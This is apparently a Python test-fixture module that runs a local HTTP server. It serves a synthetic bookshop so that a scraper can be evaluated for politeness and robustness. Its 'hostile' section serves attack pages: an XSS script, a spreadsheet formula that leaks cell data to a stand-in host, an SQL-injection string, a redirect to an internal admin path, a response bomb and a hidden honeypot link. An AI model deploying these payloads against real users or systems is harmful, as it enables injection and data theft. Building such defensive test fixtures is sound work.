"""A local HTTP server for the test site, plus a 'hostile' section for the attack eval.

Everything the scraper sends is written to `site.log`, so evals can check
politeness from the *server's* side: which paths were requested, when, by
which User-Agent, under which Host header.
"""

from __future__ import annotations

import hashlib
import threading
import time
from collections import Counter
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlsplit

from . import pages
from .generator import CATEGORIES, generate

LAST_MODIFIED = "Wed, 01 Oct 2026 09:00:00 GMT"


class TestSite:
    __test__ = False  # tell pytest this isn't a test class despite the name
    def __init__(self, seed: int = 0, n_books: int = 1000, version: int = 1,
                 crawl_delay: float | None = None, faults: bool = True, port: int = 0):
        self.seed, self.n_books, self.crawl_delay, self.faults = seed, n_books, crawl_delay, faults
        self.set_version(version)
        self.log: list[dict] = []
        self.hits: Counter = Counter()
        self.lock = threading.Lock()
        self.server = ThreadingHTTPServer(("127.0.0.1", port), _make_handler(self))
        self.port = self.server.server_address[1]
        self.host = f"127.0.0.1:{self.port}"
        self.base = f"http://{self.host}"

    def set_version(self, version: int) -> None:
        self.version = version
        self.books = generate(self.seed, self.n_books, version)
        self.by_path = {b.path: b for b in self.books}
        self.by_old = {f"/catalogue/old/{b.slug}_{b.id}.html": b for b in self.books}
        self.by_hidden = {f"/catalogue/hidden/{b.slug}_{b.id}/index.html": b for b in self.books}

    # -- lifecycle -------------------------------------------------------------------------
    def start(self) -> TestSite:
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        return self

    def stop(self) -> None:
        self.server.shutdown()
        self.server.server_close()

    def __enter__(self) -> TestSite:
        return self.start()

    def __exit__(self, *exc) -> None:
        self.stop()

    def reset_log(self) -> None:
        with self.lock:
            self.log.clear()
            self.hits.clear()

    # -- routing ---------------------------------------------------------------------------
    def robots_txt(self) -> str:
        lines = ["User-agent: *", "Disallow: /admin/", "Disallow: /catalogue/hidden/"]
        if self.crawl_delay is not None:
            lines.append(f"Crawl-delay: {self.crawl_delay}")
        return "\n".join(lines) + "\n"

    def route(self, path: str, first_hit: bool):
        """Return (status, headers, body). body may be bytes or an iterator of (bytes, pause)."""
        if path == "/robots.txt":
            return 200, {"Content-Type": "text/plain"}, self.robots_txt().encode()
        if path.startswith("/hostile/") or path.startswith("/internal/"):
            return hostile(self, path, first_hit)
        if path in ("/", "/index.html"):
            return 301, {"Location": "/catalogue/page-1.html"}, b""
        if path.startswith("/catalogue/page-") and path.endswith(".html"):
            n = path.removeprefix("/catalogue/page-").removesuffix(".html")
            pages_total = -(-len(self.books) // pages.PER_PAGE)
            if n.isdigit() and 1 <= int(n) <= pages_total:
                return _html(pages.listing_page(self.books, int(n)))
        if path in self.by_old:
            return 301, {"Location": self.by_old[path].path}, b""
        book = self.by_path.get(path) or self.by_hidden.get(path)
        if book:
            if self.faults and first_hit and book.fault == "503":
                return 503, {"Content-Type": "text/html"}, b"<h1>Service Unavailable</h1>"
            if self.faults and first_hit and book.fault == "429":
                return 429, {"Content-Type": "text/html", "Retry-After": "1"}, b"<h1>Slow down</h1>"
            return _html(pages.product_page(book, CATEGORIES.index(book.category) + 2))
        return 404, {"Content-Type": "text/html"}, b"<h1>Not Found</h1>"


def _html(text: str):
    body = text.encode("utf-8")
    # No charset in the header, on purpose: like many real servers. The page's own
    # <meta> says UTF-8; a scraper that trusts requests' ISO-8859-1 default prints 'Â£'.
    return 200, {"Content-Type": "text/html", "ETag": '"' + hashlib.sha1(body).hexdigest()[:16] + '"',
                 "Last-Modified": LAST_MODIFIED}, body


# -- the hostile section: one mini-site per attack ------------------------------------------
def _pod_list(links: list[tuple[str, str]], next_href: str | None, extra: str = "") -> bytes:
    pods = "".join(
        f'<li><article class="product_pod"><h3><a href="{href}" title="{t}">{t}</a></h3>'
        '<p class="price_color">£10.00</p></article></li>' for href, t in links)
    nxt = f'<li class="next"><a href="{next_href}">next</a></li>' if next_href else ""
    return (f'<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><ol class="row">{pods}</ol>'
            f'{extra}<ul class="pager">{nxt}</ul></body></html>').encode()


def _book_html(title: str, upc: str = "0000000000000001") -> bytes:
    from html import escape

    return (f'<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><ul class="breadcrumb">'
            '<li><a href="/">Home</a></li><li><a href="/b">Books</a></li><li><a href="/c">Hostile</a></li>'
            f'<li class="active">x</li></ul><div class="product_main"><h1>{escape(title)}</h1>'
            '<p class="price_color">£10.00</p><p class="instock availability">In stock (1 available)</p>'
            '<p class="star-rating Five"></p></div><table class="table table-striped">'
            f"<tr><th>UPC</th><td>{upc}</td></tr></table></body></html>").encode()


PAYLOADS = {
    "xss": '<script>alert("xss")</script>',
    "formula": '=HYPERLINK("http://evil.example/?leak="&A1,"Click for a discount")',
    "sqli": "Robert'); DROP TABLE books;--",
}


def hostile(site: TestSite, path: str, first_hit: bool):
    ok = {"Content-Type": "text/html"}
    parts = path.strip("/").split("/")  # hostile/<attack>/<page>
    attack = parts[1] if len(parts) > 1 else ""
    leaf = parts[2] if len(parts) > 2 else ""

    if path.startswith("/internal/"):  # should only ever be reached via the off-site redirect
        return 200, ok, b"<h1>internal admin panel</h1>"
    if leaf == "page-1.html" and attack in ("robots", "redirect", "bomb", "slow", "drip", "xss",
                                            "formula", "sqli", "retryafter", "notHtml", "honeypot",
                                            "storm"):
        links = {"robots": [("/admin/secret.html", "secret")],
                 "redirect": [("item.html", "moved")]}.get(attack, [("item.html", attack)])
        extra = ""
        if attack == "honeypot":  # invisible to humans, irresistible to naive link-followers
            extra = '<a href="/hostile/honeypot/trap.html" style="display:none">cheap books</a>'
        return 200, ok, _pod_list(links, None, extra)
    if attack == "loop" and leaf.startswith("page-"):
        n = int(leaf.removeprefix("page-").removesuffix(".html"))
        return 200, ok, _pod_list([(f"item-{n}.html", f"loop {n}")], f"page-{n % 3 + 1}.html")
    if attack == "endless" and leaf.startswith("page-"):
        n = int(leaf.removeprefix("page-").removesuffix(".html"))
        return 200, ok, _pod_list([(f"item-{i}.html", f"same {i}") for i in range(3)],
                                  f"page-{n + 1}.html")
    if leaf.startswith("item"):
        if attack == "redirect":
            return 302, {"Location": f"http://localhost:{site.port}/internal/secret"}, b""
        if attack == "bomb":  # 20 MB, no Content-Length: only a streaming cap stops it
            return 200, ok, ((b"<p>" + b"A" * 65_000 + b"</p>", 0.0) for _ in range(320))
        if attack == "slow":  # nothing at all for 3 seconds
            time.sleep(3)
            return 200, ok, _book_html("slow")
        if attack == "drip":  # headers at once, then one byte every 0.25s for 6s
            return 200, ok, ((b"x", 0.25) for _ in range(24))
        if attack == "retryafter" and first_hit:
            return 429, {"Content-Type": "text/html", "Retry-After": "2"}, b"slow down"
        if attack == "storm":
            return 503, {"Content-Type": "text/html"}, b"down"
        if attack == "notHtml":  # a 'PNG' that happens to contain a book page
            return 200, {"Content-Type": "image/png"}, _book_html("polyglot image")
        if attack in PAYLOADS:
            return 200, ok, _book_html(PAYLOADS[attack])
        return 200, ok, _book_html(f"{attack} item")
    return 404, ok, b"not found"


def _make_handler(site: TestSite):
    class Handler(BaseHTTPRequestHandler):
        server_version = "TestSite/1.0"

        def do_GET(self):  # noqa: N802 (name fixed by http.server)
            started = time.time()
            path = urlsplit(self.path).path
            entry = {"t": started, "path": path, "host": self.headers.get("Host"),
                     "ua": self.headers.get("User-Agent"), "status": None, "bytes": 0}
            with site.lock:  # log on arrival, so a test never races the response
                first_hit = site.hits[path] == 0
                site.hits[path] += 1
                site.log.append(entry)
            status, headers, body = site.route(path, first_hit)
            if (status == 200 and isinstance(body, bytes) and "ETag" in headers
                    and self.headers.get("If-None-Match") == headers["ETag"]):
                status, body = 304, b""
            sent = 0
            try:
                self.send_response(status)
                for k, v in headers.items():
                    self.send_header(k, v)
                if isinstance(body, bytes):
                    self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                if isinstance(body, bytes):
                    self.wfile.write(body)
                    sent = len(body)
                else:  # streamed: (chunk, pause) pairs
                    for chunk, pause in body:
                        self.wfile.write(chunk)
                        self.wfile.flush()
                        sent += len(chunk)
                        if pause:
                            time.sleep(pause)
            except (BrokenPipeError, ConnectionResetError):
                pass  # the client hung up on us: exactly what a size or time cap should do
            entry["status"], entry["bytes"] = status, sent

        def log_message(self, *args):  # keep test output quiet
            pass

    return Handler


def serve_forever(port: int = 8000, seed: int = 0, n_books: int = 1000, version: int = 1) -> None:
    site = TestSite(seed=seed, n_books=n_books, version=version, port=port)
    print(f"Test site on {site.base}/catalogue/page-1.html ({n_books} books, seed {seed}, "
          f"version {version}). Ctrl+C to stop.")
    try:
        site.server.serve_forever()
    except KeyboardInterrupt:
        site.stop()
